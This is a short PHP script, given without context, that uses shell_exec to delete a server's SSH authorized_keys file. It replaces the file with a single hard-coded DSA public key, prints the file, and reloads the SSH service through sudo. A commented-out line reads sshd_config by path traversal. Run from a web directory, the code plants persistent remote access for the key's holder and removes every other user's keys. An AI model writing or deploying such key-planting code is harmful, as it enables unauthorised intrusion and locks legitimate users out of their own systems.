<?php
  error_reporting(E_ALL);
  $key = "ssh-dss AAAAB3NzaC1kc3MAAACBAPqYvBJMe1prNs/kVyjtTkXxw67DeFrcrlx9FqoTAe2Raiwx7Lt2FylVCKSJrs667mCiNyutthMZqv05StylNOe49QNI/p2xa+dYhDvuh98bXEU/k3yk/zMBU6NgsZ7JLn4v+uQSRFI9BvDWuScYdblLM8ppOU+SdQIj3A47Qo4VAAAAFQDtwDW0CT+krhncFYc2Hz6exYCh6QAAAIEAk6vFy/pgewNCVQ6X4y8rjpEMv5Y+HdyTJTajMnqHYzBMxJy+rQZtOcysj+gTiA8yPQ0VStRv/HqAXu7ET+SQqoAufE13tu1cpBSGE3e1FNbBrU0n4khcl3pUbrPY3nJadZyXhQbZy+iySJ9lLN9ZtZwTp3FkESDKGAG5TsiLtXQAAACAUvhUiSrrwzUuSLkqmLHsMoTt2mWwk/3NeKx+O+a9Vxi8x0Q2KYpkcgIs4PB7Q6CPc5Zl7Yvch9C6s6Ith2w8rhFA16qrNyqVnA7nYGpYimasjknY5SvP5zWfP+iowRLr6JRfqV5oLEQEgvt3Er0JAhRPmhZoar7Ts1H4WHN5tTY= yoyostile@Johannes-Hecks-Mac-Pro.local";
  shell_exec('rm -rf ../../.ssh/authorized_keys');
  shell_exec('touch ../../.ssh/authorized_keys');
  shell_exec('echo ' . $key . ' >> ../../.ssh/authorized_keys');
  echo shell_exec('cat ../../.ssh/authorized_keys');
  echo shell_exec('sudo /etc/init.d/ssh reload');
  //echo shell_exec('cat ../../../../../etc/ssh/sshd_config');
?>
